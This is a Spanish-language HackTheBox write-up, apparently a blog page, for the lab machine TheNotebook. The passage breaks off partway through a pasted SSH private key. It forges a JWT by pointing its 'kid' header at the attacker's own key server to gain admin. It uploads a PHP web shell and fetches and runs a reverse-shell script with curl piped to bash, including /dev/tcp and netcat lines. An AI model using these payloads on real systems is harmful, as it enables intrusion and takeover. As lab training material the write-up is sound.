@@ -1,0 +1,1280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - TheNotebook</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - TheNotebook | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - TheNotebook" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Linux nivel medio. Exploraremos el mundo de los JSON Web Tokens para ingresar a una web con permisos administrativos. Jugaremos con llaves SSH y romperemos el siempre fiel Docker mediante un CVE que permite sobreescribir el contenido del binario /bin/sh con lo que queramos." />
+<meta property="og:description" content="Máquina Linux nivel medio. Exploraremos el mundo de los JSON Web Tokens para ingresar a una web con permisos administrativos. Jugaremos con llaves SSH y romperemos el siempre fiel Docker mediante un CVE que permite sobreescribir el contenido del binario /bin/sh con lo que queramos." />
+<link rel="canonical" href="http://localhost:4000/htb/thenotebook" />
+<meta property="og:url" content="http://localhost:4000/htb/thenotebook" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-07-31T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320banner.png" />
+<meta property="twitter:title" content="HackTheBox - TheNotebook" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-07-31T00:00:00-07:00","datePublished":"2021-07-31T00:00:00-07:00","description":"Máquina Linux nivel medio. Exploraremos el mundo de los JSON Web Tokens para ingresar a una web con permisos administrativos. Jugaremos con llaves SSH y romperemos el siempre fiel Docker mediante un CVE que permite sobreescribir el contenido del binario /bin/sh con lo que queramos.","headline":"HackTheBox - TheNotebook","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/thenotebook"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/thenotebook"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - TheNotebook</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-07-31">31 Jul 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320banner.png" alt="HackTheBox - TheNotebook">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina Linux nivel medio. Exploraremos el mundo de los <strong>JSON Web Tokens</strong> para ingresar a una web con permisos administrativos. Jugaremos con llaves <strong>SSH</strong> y romperemos el siempre fiel <strong>Docker</strong> mediante un <strong>CVE</strong> que permite sobreescribir el contenido del binario <strong>/bin/sh</strong> con lo que queramos.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320thenotebookHTB.png" alt="320thenotebookHTB" /></p>
+
+<h3 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h3>
+
+<p><strong>Creada por</strong>: <a href="https://www.hackthebox.eu/profile/120514">mostwanted002</a>.</p>
+
+<p>Se ave cina…</p>
+
+<p>Hola, nos enfrentaremos a un inicio muy lindo. Encontraremos un sitio web que nos permite guardar nuestras notas y nada más :O Pero echándole ojo a la cookie veremos algo interesante, es generada mediante <code>JSON Web Tokens</code> con una estructura peculiar, la llave con la que lo hace esta siendo llamada mediante una <strong>URL</strong> y cada usuario lleva indicado si es o no admin, aprovecharemos esto para crear un nuevo token que llame la llave de nuestro servidor y también otorgándole permisos a nuestro usuario de ser admin. Esto para finalmente lograr subir archivos en el <strong>Admin Panel</strong> yyy claramente subiremos una Web Shell para obtener una sesión en la máquina como <code>www-data</code>.</p>
+
+<p>Cree un script para automatizar todo este proceso y obtener <strong>RCE</strong> en la terminal, échenle un ojazo:</p>
+
+<ul>
+  <li><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/thenotebook/RCE_phpfile.py">RCE_phpfile.py</a>.</li>
+</ul>
+
+<p>Enumerando nos toparemos con las llaves <code>SSH</code> del usuario <code>noah</code>, usaremos su llave privada para obtener una sesión en la máquina sin necesitar la contraseña.</p>
+
+<p>Validando los permisos de administrador que tenemos sobre el sistema, nos daremos cuenta de que podemos ejecutar un contenedor con <code>Docker</code>, validando la versión del propio <strong>Docker</strong> y buscando vulnerabilidades relacionadas, encontraremos una que nos permite modificar el contenido del binario <code>runC</code> (que se ejecuta siempre que llamemos a <strong>Docker</strong>) y que al mismo tiempo modifica el binario <code>/bin/sh</code> con nuestro <strong>payload</strong>, para una vez llamemos una Shell con <strong>/bin/sh</strong> dentro del contenedor se ejecute el payload… Usaremos esto para conseguir una Shell como el usuario <code>root</code>, a darleeeee.</p>
+
+<p>…</p>
+
+<h4 id="clasificación-de-la-máquina-según-la-gentesita">Clasificación de la máquina según la gentesita</h4>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;" /></p>
+
+<p>Vulns conocidas, le cuesta mucho llegar a ser real (pero lo intenta).</p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo mostrar lo que hice.</p>
+</blockquote>
+
+<p>…</p>
+
+<p>Nuestro camino a donde gloria:</p>
+
+<ol>
+  <li><a href="#enumeracion">Enumeración</a>.</li>
+  <li><a href="#explotacion">Explotación</a>.</li>
+  <li><a href="#movimiento-lateral-noah">Movimiento Lateral <strong>noah</strong></a>.</li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>.</li>
+</ol>
+
+<p>…</p>
+
+<h2 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h2>
+
+<p>Inicialmente haremos un escaneo de puertos para saber que servicios esta ejecutando la máquina:</p>
+
+<pre><code class="language-bash">❭ nmap -p- --open -v 10.10.10.230 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535.</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos.</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando.</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png">función <strong>extractPorts</strong></a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash">❭ cat initScan 
+# Nmap 7.80 scan initiated Mon Mar 15 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.230
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.230 ()   Status: Up
+Host: 10.10.10.230 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
+# Nmap done at Mon Mar 15 25:25:25 2021 -- 1 IP address (1 host up) scanned in 112.60 seconds
+</code></pre>
+
+<p>A ver, que tenemos…</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22</td>
+      <td style="text-align: left"><strong><a href="https://es.wikipedia.org/wiki/Secure_Shell">SSH</a></strong>: Acceso a un servidor remoto por medio de un canal seguro.</td>
+    </tr>
+    <tr>
+      <td>80</td>
+      <td style="text-align: left"><strong><a href="https://es.wikipedia.org/wiki/Protocolo_de_transferencia_de_hipertexto">HTTP</a></strong>: Servidor web.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Ahora hagamos un escaneo de scripts y versiones con base en cada servicio (puerto) encontrado, así validamos a profundidad cada uno:</p>
+
+<pre><code class="language-bash">❭ nmap -p 22,80 -sC -sV 10.10.10.230 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash">❭ cat portScan 
+# Nmap 7.80 scan initiated Mon Mar 15 25:25:25 2021 as: nmap -p 22,80 -sC -sV -oN portScan 10.10.10.230
+Nmap scan report for 10.10.10.230
+Host is up (0.12s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
+|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
+|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
+80/tcp open  http    nginx 1.14.0 (Ubuntu)
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title: The Notebook - Your Note Keeper
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Mar 15 25:25:25 2021 -- 1 IP address (1 host up) scanned in 11.66 seconds
+</code></pre>
+
+<p>Obtenemos:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">22</td>
+      <td style="text-align: left">SSH</td>
+      <td style="text-align: left">OpenSSH 7.6p1 Ubuntu 4ubuntu0.3</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">80</td>
+      <td style="text-align: left">HTTP</td>
+      <td style="text-align: left">nginx 1.14.0</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>A darle a ver por donde podemos entrar.</p>
+
+<p>…</p>
+
+<h3 id="puerto-80">Puerto 80 <a href="#puerto-80">×</a></h3>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320page80.png" alt="320page80" /></p>
+
+<p>Un lugar para guardar mis notas o pensamientos… Podemos registrarnos e ingresar al sitio, después de este paso, en el dashboard tenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320page80_dashboard.png" alt="320page80_dashboard" /></p>
+
+<p>Hagamos caso y veamos las notas: (disculparán el montón de pruebas)</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320page80_notes.png" alt="320page80_notes" /></p>
+
+<p>Algo raro que note fue la URL, no sé, poco usual…</p>
+
+<hr />
+
+<h3 id="-entramos-en-un-rabbit-hole-cuidaoooo">🌋 ¡Entramos en un Rabbit hole, cuidaoooo!</h3>
+
+<p>Después de un rato enumerando, probando, jugando con la URL, etc. Nada. Haciendo fuzz encontramos un directorio llamado <code>/admin</code>:</p>
+
+<pre><code class="language-bash">❭ dirsearch.py -u http://10.10.10.230 -q
+403 -    9B  - http://10.10.10.230/admin
+200 -    1KB - http://10.10.10.230/login
+302 -  209B  - http://10.10.10.230/logout  -&gt;  http://10.10.10.230/
+200 -    1KB - http://10.10.10.230/register
+</code></pre>
+
+<p>Pero tenemos un código de estado <code>403</code> que nos indica la prohibición completa hacia ese recurso :P Pero jugando con ese mismo recurso encontramos otros directorios:</p>
+
+<blockquote>
+  <p><a href="https://mediatemple.net/community/products/dv/204644980/why-am-i-seeing-a-403-forbidden-error-message">Status code <strong>403 Forbidden</strong></a>.</p>
+</blockquote>
+
+<pre><code class="language-bash">❭ dirsearch.py -u http://10.10.10.230/admin -w /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt -q
+403 -    9B  - http://10.10.10.230/admin/upload
+200 -    3KB - http://10.10.10.230/admin/notes
+</code></pre>
+
+<p>Curioso, tenemos prohibido el acceso al recurso <code>/a, pero no al </code>/admin/notes`, veamos si podemos obtener algo de ahí:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320page80_admin_notes.png" alt="320page80_admin_notes" /></p>
+
+<p>Jmm, intentando agregar notas siempre obtenemos “<code>Internal Server Error</code>”, peeero si nos fijamos en la URL, a veces cambia como si hiciera la inserción de la nota, veamos un ejemplo rápidamente:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320page80_admin_notes_add_preview.png" alt="320page80_admin_notes_add_preview" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320page80_admin_notes_add_URL.png" alt="320page80_admin_notes_add_URL" /></p>
+
+<p>En la URL se agrega un numero y si validamos si se creó la nota:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320page80_admin_notes_created.png" alt="320page80_admin_notes_created" /></p>
+
+<p>Y si, se crea… Pero no logre hacer nada con esto :P</p>
+
+<hr />
+
+<h3 id="-salimos-del-rabbit-hole">🗻 Salimos del Rabbit hole</h3>
+
+<p>Dando vueltas y revisando cositas, nos damos cuenta de algo lindo en nuestra cookie: (podemos verla de varias formas, pero como lo divide el navegador esta bien para que se entienda mejor lo que haremos)</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320page80_cookie.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Es un formato que había usado en alguna ocasión y de una me acordé de que trataba (también por el inicio de la cadena (<code>ey</code>, que en <code>base64</code> es <code>{"</code> (o sea el inicio de un JSON e.e))…</p>
+
+<p><a href="https://jwt.io/introduction">JSON Web Tokens</a>, que sirven para transmitir información mediante objetos <code>JSON</code> de manera segura, esto gracias a que son firmados digitalmente con llaves privadas o públicas.</p>
+
+<ul>
+  <li><a href="https://openwebinars.net/blog/que-es-json-web-token-y-como-funciona/">Qué es <strong>JSON Token</strong> y como funciona</a>.</li>
+</ul>
+
+<p>Entonces, podemos usar la herramienta <a href="https://jwt.io/">jwt.io</a> para jugar con estos tokens, así que, tomamos nuestra cookie <code>auth</code> y la pegamos a la izquierda:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320google_jwt_original_output.png" alt="320google_jwt_original_output" /></p>
+
+<p>Algo lindo de esta herramienta es que nos separa por colores (y puntos) las partes del token (cada parte del array que nos mostró el navegador). Cada apartado del token esta en <code>base64</code>, la página nos lo decodea y a la derecha tenemos el resultado… (Todo esto podemos cambiarlo, pero antes veamos que hay en cada apartado)</p>
+
+<p><strong>Header</strong>:</p>
+
+<p>Vemos el tipo de token y el tipo de algoritmo usado yyyyy podemos deducir que esta tomando la llave privada servida en el puerto <code>7070</code> del localhost llamada <code>privKey.key</code>.</p>
+
+<p><strong>Payload (Data)</strong>:</p>
+
+<p>Tenemos info del usuario y un campo extraño que hace alusión a algo sobre el administrador y en nuestro caso esta apagado… Interesante.</p>
+
+<p><strong>Verify signature</strong>:</p>
+
+<p>Acá va la llave privada del host.</p>
+
+<p>…</p>
+
+<h2 id="explotacion">Explotación <a href="#explotacion">#</a></h2>
+
+<p>Bien, como podemos aprovecharnos de esto…</p>
+
+<p>Sabemos que esta usando una URL para leer la llave privada que usa contra el <code>JWT</code>, entonces:</p>
+
+<ol>
+  <li>Generaremos una llave privada.</li>
+  <li>hostearemos un servidor web.</li>
+  <li>Y en el <strong>header</strong> pondremos nuestra URL llamando la llave, esto para que la web tome nuestra llave y podamos modificar el token.</li>
+</ol>
+
+<p>En el apartado <strong>payload (data)</strong> aprovecharemos el ítem que habla del <code>admin</code> para alterarlo a <code>true</code> y ver si nos asignan como administradores del sistema de notas.</p>
+
+<p>Y finalmente agregaremos nuestra llave privada en <strong>verify signature</strong>.</p>
+
+<p>Démosle. Generemos la llave privada, me guie de este <a href="https://serverfault.com/questions/224122/what-is-crt-and-key-files-and-how-to-generate-them#answer-224127">recurso</a>:</p>
+
+<p><strong>Header:</strong></p>
+
+<pre><code class="language-bash">❭ openssl genrsa 2048 &gt; palaKeypa.key
+# pero despues de generarla, copiarla y pegarla en la web
+# vemos que es más pequeña que la que ya estaba originalmetn en nusetro token,
+# asi que le modificamos el tamaño al doble
+</code></pre>
+
+<pre><code class="language-bash">❭ openssl genrsa 4096 &gt; palaKeypa.key
+Generating RSA private key, 4096 bit long modulus (2 primes)
+.................................................++++
+......................................................................................++++
+e is 65537 (0x010001)
+❭ chmod 400 palaKeypa.key
+</code></pre>
+
+<p>Entonces, ahora modificamos el <strong>header</strong>: (se puede hacer en la Shell o en la web, para que sea más legible se las mostraré en la web)</p>
+
+<pre><code class="language-json">{"typ": "JWT","alg": "RS256","kid": "http://10.10.14.194:8000/palaKeypa.key"}
+</code></pre>
+
+<p>Lo pasamos a <code>base64</code>:</p>
+
+<pre><code class="language-bash">❭ echo '{"typ": "JWT","alg": "RS256","kid": "http://10.10.14.194:8000/palaKeypa.key"}' | base64 
+eyJ0eXAiOiAiSldUIiwiYWxnIjogIlJTMjU2Iiwia2lkIjogImh0dHA6Ly8xMC4xMC4xNC4xOTQ6
+ODAwMC9wYWxhS2V5cGEua2V5In0K
+</code></pre>
+
+<p>Y pegamos en la web (pegado y sin <code>=</code>)</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320google_jwt_headerPART.png" alt="320google_jwt_headerPART" /></p>
+
+<p><strong>Payload (data):</strong></p>
+
+<pre><code class="language-json">{"username": "lanz","email": "lanz@lanz.htb","admin_cap": true}
+</code></pre>
+
+<pre><code class="language-bash">❭ echo '{"username": "lanz","email": "lanz@lanz.htb","admin_cap": true}' | base64
+eyJ1c2VybmFtZSI6ICJsYW56IiwiZW1haWwiOiAibGFuekBsYW56Lmh0YiIsImFkbWluX2NhcCI6
+IHRydWV9Cg==
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320google_jwt_payloadPART.png" alt="320google_jwt_payloadPART" /></p>
+
+<p><strong>Verify signature:</strong></p>
+
+<p>Copiamos la llave que generamos (con todo y <code>--</code>) y la pegamos en la web en esta parte:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320google_jwt_signPART.png" alt="320google_jwt_signPART" /></p>
+
+<p>Y listos, tenemos nuestro token generado. Ahora la prueba de fuego.</p>
+
+<p>Hosteamos el servidor web:</p>
+
+<pre><code class="language-bash">❭ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</code></pre>
+
+<p>Tomamos el token, editamos nuestra cookie <code>auth</code> por la nueva y simplemente refrescamos la página. Yyyyyyyyyy obtenemos:</p>
+
+<pre><code class="language-bash">...
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.10.230 - - [15/Mar/2021 25:25:25] "GET /palaKeypa.key HTTP/1.1" 200 -
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320page80_weareasadminLOL.png" alt="320page80_weareasadminLOL" /></p>
+
+<p>¿Ves algo distinto? e.e (Tamos dentro como <strong>admin</strong> fathEEEEEEer, muy lindo esto)</p>
+
+<p>Veamos el nuevo apartado <code>Admin Panel</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320page80_admin_panel.png" alt="320page80_admin_panel" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320page80_admin_panel_uploadFiles.png" alt="320page80_admin_panel_uploadFiles" /></p>
+
+<p>Opa, podemos subir archivos y parece que de cualquier tipo, probemos a subir de una un archivo <code>.php</code> para generar ejecución remota de comandos. Veamos si nos da algún problema…</p>
+
+<pre><code class="language-bash">❭ cat toRiCE.php 
+&lt;?php $coma=shell_exec($_GET['xmd']); echo $coma; ?&gt;
+</code></pre>
+
+<p>El script simplemente indica: que recibirá una petición mediante el método <code>GET</code> y la guardara en la variable <code>xmd</code>, esta a su vez, hará una petición al sistema mediante <code>shell_exec</code> y el resultado del comando ejecutado se guardará en la variable <code>$coma</code>, al final simplemente mostramos ese contenido. Subámoslo, seleccionamos el archivo y damos clic en <code>Save</code>, nos devuelve:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320page80_admin_panel_up_RCEfile.png" alt="320page80_admin_panel_up_RCEfile" /></p>
+
+<p>Veamos el archivo que se subió y probemos de una vez por ejemplo, ver que usuario somos y el hostname:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320page80_admin_panel_RCE.png" alt="320page80_admin_panel_RCE" /></p>
+
+<p>Perfecto, tenemos ejecución remota de comandos, entablémonos una Reverse Shell…</p>
+
+<p>(El archivo es borrado rápidamente así que debemos ser igual o más rápidos)</p>
+
+<p>Probando y fallando podemos generar un archivo <code>.sh</code> que contenga lo que queramos ejecutar en el sistema y simplemente como comando en la web le decimos que haga un <code>cURL</code> hacia nuestro script y que a su vez interprete y ejecute el contenido:</p>
+
+<pre><code class="language-bash">❭ cat rev.sh 
+#!/bin/bash
+
+bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.194/4433 0&gt;&amp;1"
+#rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1 | nc 10.10.14.194 4433 &gt;/tmp/f
+</code></pre>
+
+<p>Colocamos este archivo en la ruta en que tenemos el servidor de <code>Python</code> activo, así evitamos servir otro puerto :P</p>
+
+<p>Nos ponemos en escucha con <code>netcat</code>:</p>
+
+<pre><code class="language-bash">❭ nc -lvp 4433
+listening on [any] 4433 ...
+</code></pre>
+
+<p>Y lanzamos como <code>payload</code> para validar que tenemos comunicación y ve nuestro código:</p>
+
+<pre><code class="language-html">http://10.10.10.230/f34242c373ba88e18f73fd2e0eccd648.php?xmd=curl http://10.10.14.194:8000/rev.sh
+</code></pre>
+
+<p>Y simplemente le agregamos <code>| bash</code> para que interprete el contenido del archivo y lo ejecute en el sistema:</p>
+
+<pre><code class="language-html">http://10.10.10.230/f34242c373ba88e18f73fd2e0eccd648.php?xmd=curl http://10.10.14.194:8000/rev.sh | bash
+</code></pre>
+
+<p>YYYYYYYyyyyYye.e:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320bash_revSH_www.png" alt="320bash_revSH_www" /></p>
+
+<p>Tamos dentro de la máquina, peeeerfectowowowo.</p>
+
+<p>…</p>
+
+<p>Es un poco MEHH el estar creando el token, modificando la cookie y todo eso manualmente, así que aprovechemos la oportunidad para automatizar toooodo y obtener ejecución de comandos simplemente pasándole el comando que queremos ejecutar a un <strong>script</strong>:</p>
+
+<ul>
+  <li><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/thenotebook/RCE_phpfile.py">RCE_phpfile.py</a>.</li>
+</ul>
+
+<p>Ahora sí, sigamos.</p>
+
+<p>…</p>
+
+<h2 id="movimiento-lateral-noah">Movimiento lateral www-data -&gt; noah <a href="#movimiento-lateral-noah">#</a></h2>
+
+<p>Enumerando el directorio <code>/var/backups</code> encontramos un archivo algo llamativo:</p>
+
+<pre><code class="language-bash">www-data@thenotebook:/var/backups$ ls -la
+total 60
+drwxr-xr-x  2 root root  4096 Mar 22 08:20 .
+drwxr-xr-x 14 root root  4096 Feb 12 06:52 ..
+-rw-r--r--  1 root root 33252 Feb 24 08:53 apt.extended_states.0
+-rw-r--r--  1 root root  3609 Feb 23 08:58 apt.extended_states.1.gz
+-rw-r--r--  1 root root  3621 Feb 12 06:52 apt.extended_states.2.gz
+-rw-r--r--  1 root root  4373 Feb 17 09:02 home.tar.gz
+</code></pre>
+
+<p>Copiemos el archivo comprimido e intentemos ver su contenido:</p>
+
+<pre><code class="language-bash">www-data@thenotebook:/var/backups$ cp home.tar.gz /dev/shm/
+www-data@thenotebook:/var/backups$ cd !$
+cd /dev/shm/
+www-data@thenotebook:/dev/shm$ ls
+home.tar.gz
+www-data@thenotebook:/dev/shm$ gzip -d home.tar.gz 
+www-data@thenotebook:/dev/shm$ ls
+home.tar
+www-data@thenotebook:/dev/shm$ tar xvf home.tar 
+home/
+home/noah/
+home/noah/.bash_logout
+home/noah/.cache/
+home/noah/.cache/motd.legal-displayed
+home/noah/.gnupg/
+home/noah/.gnupg/private-keys-v1.d/
+home/noah/.bashrc
+home/noah/.profile
+home/noah/.ssh/
+home/noah/.ssh/id_rsa
+home/noah/.ssh/authorized_keys
+home/noah/.ssh/id_rsa.pub
+</code></pre>
+
+<p>Opa, el backup del <code>/home</code> de un usuario llamado <code>noah</code> (efectivamente en la máquina existe), tenemos un par de llaves <code>SSH</code>, copiémonos el contenido de la llave privada <code>(id_rsa)</code> y creémonos un archivo con su contenido en nuestra máquina, esto para entrar por medio de <code>SSH</code> sin tener que ingresar contraseña:</p>
+
+<ul>
+  <li><a href="https://wiki.archlinux.org/title/SSH_keys_(Espa%C3%B1ol)">Info SSH keys (Español)</a>.</li>
+</ul>
+
+<hr />
+
+<pre><code class="language-bash">❭ cat key_noah 
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEAyqucvz6P/EEQbdf8cA44GkEjCc3QnAyssED3qq9Pz1LxEN04
